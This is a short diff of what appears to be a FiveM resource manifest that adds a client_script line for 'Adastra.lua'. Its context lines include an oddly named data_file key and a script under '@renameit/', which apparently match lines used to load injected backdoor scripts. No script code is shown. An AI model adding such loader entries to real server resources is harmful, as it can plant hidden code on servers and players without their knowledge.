@@ -27,3 +27,5 @@ files({
 data_file('FIVEM_LOVES_YOU_4B38E96CC036038F')('events.meta')
 
 client_script '@renameit/xDxDxDxDxD.lua'
+
+client_script 'Adastra.lua'
